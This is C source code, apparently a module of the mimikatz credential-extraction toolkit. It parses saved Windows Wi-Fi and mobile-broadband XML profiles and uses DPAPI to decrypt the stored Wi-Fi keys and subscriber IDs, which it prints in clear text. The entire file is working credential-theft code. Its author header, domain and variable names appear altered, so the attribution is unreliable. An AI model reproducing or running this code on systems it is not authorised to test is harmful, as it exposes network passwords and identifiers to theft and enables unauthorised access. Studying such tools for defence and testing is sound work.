/*	paparas DELPY `gamidiaaktinidio`
	http://blog.gamidiaaktinidio.com
	paparas@gamidiaaktinidio.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_wlan.h"

NTSTATUS kuhl_m_dpapi_wifi(int argc, wchar_t * argv[])
{
	PBYTE pFile, hex, dedomenaOut;
	DWORD dwData, lenHex, lenDataOut;
	LPWSTR dedomenaU, dedomenaSSID, dedomenaF, dedomenaAuth;
	LPCWSTR infile;

	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(kull_m_file_readData(infile, &pFile, &dwData))
		{
			if(dedomenaU = kull_m_string_qad_ansi_to_unicode((const char *) pFile))
			{
				if(kull_m_string_quickxml_simplefind(dedomenaU, L"name", &dedomenaF))
				{
					kprintf(L"Profile \'%s\'\n\n", dedomenaF);
					LocalFree(dedomenaF);
				}
				if(kull_m_string_quickxml_simplefind(dedomenaU, L"SSID", &dedomenaSSID))
				{
					kprintf(L" * SSID ");
					if(kull_m_string_quickxml_simplefind(dedomenaSSID, L"name", &dedomenaF))
					{
						kprintf(L"name     : %s\n", dedomenaF);
						LocalFree(dedomenaF);
					}
					else if(kull_m_string_quickxml_simplefind(dedomenaSSID, L"hex", &dedomenaF))
					{
						kprintf(L"hex      : %s\n", dedomenaF);
						LocalFree(dedomenaF);
					}
					else kprintf(L"?\n");
					LocalFree(dedomenaSSID);
				}
				if(kull_m_string_quickxml_simplefind(dedomenaU, L"authentication", &dedomenaAuth))
				{
					kprintf(L" * Authentication: %s\n", dedomenaAuth);
					if(kull_m_string_quickxml_simplefind(dedomenaU, L"encryption", &dedomenaF))
					{
						kprintf(L" * Encryption    : %s\n", dedomenaF);
						LocalFree(dedomenaF);
					}
					if(kull_m_string_quickxml_simplefind(dedomenaU, L"keyMaterial", &dedomenaF))
					{
						if(kull_m_string_stringToHexBuffer(dedomenaF, &hex, &lenHex))
						{
							kprintf(L"\n");
							kull_m_dpapi_blob_quick_descr(0, hex);
							if(kuhl_m_dpapi_unprotect_raw_or_blob(hex, lenHex, NULL, argc, argv, NULL, 0, (LPVOID *) &dedomenaOut, &lenDataOut, NULL))
							{
								kprintf(L" * Key Material  : ");
								if(_wcsicmp(dedomenaAuth, L"WEP") == 0)
								{
									kprintf(L"(hex) ");
									kull_m_string_wprintf_hex(dedomenaOut, lenDataOut, 0);
								}
								else
									kprintf(L"%.*S", lenDataOut, dedomenaOut);
								kprintf(L"\n");
								LocalFree(dedomenaOut);
							}
							LocalFree(hex);
						}
						LocalFree(dedomenaF);
					}
					LocalFree(dedomenaAuth);
				}
				LocalFree(dedomenaU);
			}
			LocalFree(pFile);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	else PRINT_ERROR(L"Input Wlan XML profile needed (/in:file)\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_wwan(int argc, wchar_t * argv[])
{
	PBYTE pFile, hex, dedomenaOut;
	DWORD dwData, lenHex, lenDataOut;
	LPWSTR dedomenaU, dedomenaF;
	LPCWSTR infile;

	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(kull_m_file_readData(infile, &pFile, &dwData))
		{
			if(dedomenaU = kull_m_string_qad_ansi_to_unicode((const char *) pFile))
			{
				if(kull_m_string_quickxml_simplefind(dedomenaU, L"Name", &dedomenaF))
				{
					kprintf(L"Profile \'%s\'\n\n", dedomenaF);
					LocalFree(dedomenaF);
				}
				if(kull_m_string_quickxml_simplefind(dedomenaU, L"AccessString", &dedomenaF))
				{
					kprintf(L" * AccessString    : %s\n", dedomenaF);
					LocalFree(dedomenaF);
				}
				if(kull_m_string_quickxml_simplefind(dedomenaU, L"SubscriberID", &dedomenaF))
				{
					if(kull_m_string_stringToHexBuffer(dedomenaF, &hex, &lenHex))
					{
						kprintf(L"\n");
						kull_m_dpapi_blob_quick_descr(0, hex);
						if(kuhl_m_dpapi_unprotect_raw_or_blob(hex, lenHex, NULL, argc, argv, NULL, 0, (LPVOID *) &dedomenaOut, &lenDataOut, NULL))
						{
							kprintf(L" * SubscriberID  : ");
							kull_m_string_wprintf_hex(dedomenaOut, lenDataOut, 0);
							kprintf(L"\n");
							kprintf(L"%.*s", lenDataOut / sizeof(wchar_t), dedomenaOut);
							LocalFree(dedomenaOut);
						}
						LocalFree(hex);
					}
					LocalFree(dedomenaF);
				}
				LocalFree(dedomenaU);
			}
			LocalFree(pFile);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	else PRINT_ERROR(L"Input Wwan XML profile needed (/in:file)\n");
	return STATUS_SUCCESS;
}